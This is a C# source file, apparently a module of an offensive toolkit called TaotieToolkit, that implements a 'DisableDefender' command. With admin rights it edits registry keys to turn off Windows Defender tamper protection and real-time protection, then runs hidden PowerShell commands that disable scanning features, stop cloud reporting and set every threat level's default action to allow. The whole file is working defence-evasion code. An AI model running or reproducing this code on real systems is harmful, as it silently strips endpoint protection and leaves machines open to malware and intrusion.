using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using TaotieToolkit.config;

namespace TaotieToolkit
{
    internal class DisableDefender : ICommand, ICommandMarker
    {
        public string Name => "DisableDefender";
        public string Description => "禁用Windows Defender";

        private static void CheckDefender()
        {
            Process proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = "Get-MpPreference -verbose",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            proc.Start();
            while (!proc.StandardOutput.EndOfStream)
            {
                string line = proc.StandardOutput.ReadLine();

                if (line.StartsWith(@"DisableRealtimeMonitoring") && line.EndsWith("False"))
                    Utils.RunPS("Set-MpPreference -DisableRealtimeMonitoring $true"); //real-time protection

                else if (line.StartsWith(@"DisableBehaviorMonitoring") && line.EndsWith("False"))
                    Utils.RunPS("Set-MpPreference -DisableBehaviorMonitoring $true"); //behavior monitoring

                else if (line.StartsWith(@"DisableBlockAtFirstSeen") && line.EndsWith("False"))
                    Utils.RunPS("Set-MpPreference -DisableBlockAtFirstSeen $true");

                else if (line.StartsWith(@"DisableIOAVProtection") && line.EndsWith("False"))
                    Utils.RunPS("Set-MpPreference -DisableIOAVProtection $true"); //scans all downloaded files and attachments

                else if (line.StartsWith(@"DisablePrivacyMode") && line.EndsWith("False"))
                    Utils.RunPS("Set-MpPreference -DisablePrivacyMode $true"); //displaying threat history

                else if (line.StartsWith(@"SignatureDisableUpdateOnStartupWithoutEngine") && line.EndsWith("False"))
                    Utils.RunPS("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true"); //definition updates on startup

                else if (line.StartsWith(@"DisableArchiveScanning") && line.EndsWith("False"))
                    Utils.RunPS("Set-MpPreference -DisableArchiveScanning $true"); //scan archive files, such as .zip and .cab files

                else if (line.StartsWith(@"DisableIntrusionPreventionSystem") && line.EndsWith("False"))
                    Utils.RunPS("Set-MpPreference -DisableIntrusionPreventionSystem $true"); // network protection 

                else if (line.StartsWith(@"DisableScriptScanning") && line.EndsWith("False"))
                    Utils.RunPS("Set-MpPreference -DisableScriptScanning $true"); //scanning of scripts during scans

                else if (line.StartsWith(@"SubmitSamplesConsent") && !line.EndsWith("2"))
                    Utils.RunPS("Set-MpPreference -SubmitSamplesConsent 2"); //MAPSReporting 

                else if (line.StartsWith(@"MAPSReporting") && !line.EndsWith("0"))
                    Utils.RunPS("Set-MpPreference -MAPSReporting 0"); //MAPSReporting 

                else if (line.StartsWith(@"HighThreatDefaultAction") && !line.EndsWith("6"))
                    Utils.RunPS("Set-MpPreference -HighThreatDefaultAction 6 -Force"); // high level threat // Allow

                else if (line.StartsWith(@"ModerateThreatDefaultAction") && !line.EndsWith("6"))
                    Utils.RunPS("Set-MpPreference -ModerateThreatDefaultAction 6"); // moderate level threat

                else if (line.StartsWith(@"LowThreatDefaultAction") && !line.EndsWith("6"))
                    Utils.RunPS("Set-MpPreference -LowThreatDefaultAction 6"); // low level threat

                else if (line.StartsWith(@"SevereThreatDefaultAction") && !line.EndsWith("6"))
                    Utils.RunPS("Set-MpPreference -SevereThreatDefaultAction 6"); // severe level threat
            }
        }

        // Disable Defender
        public void Execute(string[] args)
        {
            if (!Utils.isAdmin())
            {
                Console.WriteLine("\t[-] Access denied, administrator rights needed to disable Windows Defender!");
                return;
            }

            Utils.RegistryEdit(@"SOFTWARE\Microsoft\Windows Defender\Features", "TamperProtection", "0"); //Windows 10 1903 Redstone 6
            Utils.RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", "1");
            Utils.RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableBehaviorMonitoring", "1");
            Utils.RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableOnAccessProtection", "1");
            Utils.RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableScanOnRealtimeEnable", "1");

            CheckDefender();
            Console.WriteLine("[*] Windows Defender disabled!");
        }

     
     

    }
}
